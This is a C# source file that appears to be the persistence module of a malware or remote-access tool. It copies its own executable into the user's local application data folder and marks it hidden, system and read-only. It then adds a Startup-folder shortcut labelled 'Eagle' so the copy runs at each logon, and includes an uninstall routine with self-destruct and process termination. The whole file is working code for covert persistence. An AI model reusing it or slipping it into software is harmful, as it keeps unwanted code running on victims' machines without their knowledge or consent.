using IWshRuntimeLibrary;
using System;
using System.Diagnostics;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Offline.Persistence
{
    internal class StartupFolder
    {
        private static void CreateShortcut(string shortcutName, string shortcutPath, string targetFileLocation)
        {
            string shortcutLocation = System.IO.Path.Combine(shortcutPath, shortcutName + ".lnk");
            WshShell shell = new WshShell();
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutLocation);
            shortcut.Description = "Eagle";   
            //shortcut.IconLocation = @"c:\myicon.ico";           
            shortcut.TargetPath = targetFileLocation;                
            shortcut.Save();                   
        }

        internal static void Install(string shortCutName, string appName) 
        {
            string newPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + appName;
            if (System.IO.File.Exists(newPath))
                return;

            System.IO.File.WriteAllBytes(newPath, System.IO.File.ReadAllBytes(Application.ExecutablePath));
            Imports.SetFileAttributes(newPath, Imports.FileAttributes.Hidden | Imports.FileAttributes.System | Imports.FileAttributes.Readonly);
            CreateShortcut(shortCutName, Environment.GetFolderPath(Environment.SpecialFolder.Startup), newPath);
        }

        internal static void Uninstall(string shortCutName, string appName)
        {
            System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + shortCutName +".lnk");
            SelfDestruct.InitiateSelfDestructSequence();//TO CHECK : Currently not working
            Imports.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
        }
    }
}
